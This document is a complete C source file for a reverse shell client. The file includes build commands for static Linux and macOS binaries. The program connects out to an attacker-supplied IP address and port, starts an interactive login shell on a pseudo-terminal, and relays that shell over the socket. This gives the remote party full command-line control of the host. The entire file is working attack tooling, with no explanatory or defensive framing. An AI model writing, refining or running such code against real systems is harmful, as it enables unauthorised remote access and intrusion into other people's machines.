#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <termios.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#include <sys/syscall.h>
#include <signal.h>

#ifdef __APPLE__
    #include <util.h>
#else
    #include <pty.h>
#endif

// Compile with:
// For Linux (x86_64):   gcc -static -O3 -o reverse reverse.c
// For macOS:            gcc -O3 -o reverse reverse.c
// For Linux (musl):     musl-gcc -static -O3 -o reverse reverse.c

#ifdef __APPLE__
    #define PLATFORM_OPENPTY openpty
#else
    // Improved openpty implementation for static linking
    static int platform_openpty(int *amaster, int *aslave, char *name,
                              struct termios *termp, struct winsize *winp) {
        int master, slave;
        char *slave_name;

        master = posix_openpt(O_RDWR | O_NOCTTY);
        if (master == -1) return -1;

        if (grantpt(master) == -1) {
            close(master);
            return -1;
        }

        if (unlockpt(master) == -1) {
            close(master);
            return -1;
        }

        slave_name = ptsname(master);
        if (slave_name == NULL) {
            close(master);
            return -1;
        }

        slave = open(slave_name, O_RDWR | O_NOCTTY);
        if (slave == -1) {
            close(master);
            return -1;
        }

        if (termp) tcsetattr(slave, TCSAFLUSH, termp);
        if (winp) ioctl(slave, TIOCSWINSZ, winp);

        *amaster = master;
        *aslave = slave;
        if (name) strcpy(name, slave_name);
        return 0;
    }
    #define PLATFORM_OPENPTY platform_openpty
#endif

void set_nonblocking(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        write(2, "Usage: reverse <ip> <port>\n", 26);
        return 1;
    }

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    addr.sin_addr.s_addr = inet_addr(argv[1]);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        return 1;
    }

    // Create pseudo-terminal with proper terminal settings
    int master, slave;
    char name[1024];
    struct winsize ws = {
        .ws_row = 24,
        .ws_col = 80,
        .ws_xpixel = 0,
        .ws_ypixel = 0
    };

    // Setup terminal attributes
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    cfmakeraw(&term);
    term.c_lflag |= ECHO | ICANON | ISIG | IEXTEN;
    term.c_iflag |= ICRNL;
    term.c_oflag |= ONLCR | OPOST;
    
    if (PLATFORM_OPENPTY(&master, &slave, name, &term, &ws) < 0) {
        return 1;
    }

    // Set master and slave to non-blocking mode
    set_nonblocking(master);
    set_nonblocking(slave);

    pid_t pid = fork();
    if (pid < 0) return 1;

    if (pid == 0) {  // Child process
        close(master);
        close(sock);

        // Create new session and process group
        setsid();
        ioctl(slave, TIOCSCTTY, 0);

        // Set up stdio
        dup2(slave, 0);
        dup2(slave, 1);
        dup2(slave, 2);

        if (slave > 2) close(slave);

        // Clear environment and set basic variables
        clearenv();
        setenv("TERM", "xterm-256color", 1);
        setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
        setenv("PS1", "\\w\\$ ", 1);

        // Get default shell
        char *shell = getenv("SHELL");
        if (!shell) shell = "/bin/bash";
        if (access(shell, X_OK) != 0) shell = "/bin/sh";

        // Execute shell
        char *const args[] = {shell, "--login", "-i", NULL};
        execv(shell, args);
        exit(1);
    }

    // Parent process
    close(slave);

    // Set up signal handling
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    fd_set fd_list;
    char buffer[4096];
    int maxfd = (sock > master) ? sock : master;
    
    while (1) {
        FD_ZERO(&fd_list);
        FD_SET(sock, &fd_list);
        FD_SET(master, &fd_list);
        
        if (select(maxfd + 1, &fd_list, NULL, NULL, NULL) < 0) {
            if (errno == EINTR) continue;
            break;
        }
        
        if (FD_ISSET(sock, &fd_list)) {
            int count = read(sock, buffer, sizeof(buffer));
            if (count <= 0) break;
            write(master, buffer, count);
        }
        
        if (FD_ISSET(master, &fd_list)) {
            int count = read(master, buffer, sizeof(buffer));
            if (count <= 0) break;
            write(sock, buffer, count);
        }
    }

    // Clean up
    kill(pid, SIGTERM);
    close(master);
    close(sock);
    return 0;
}
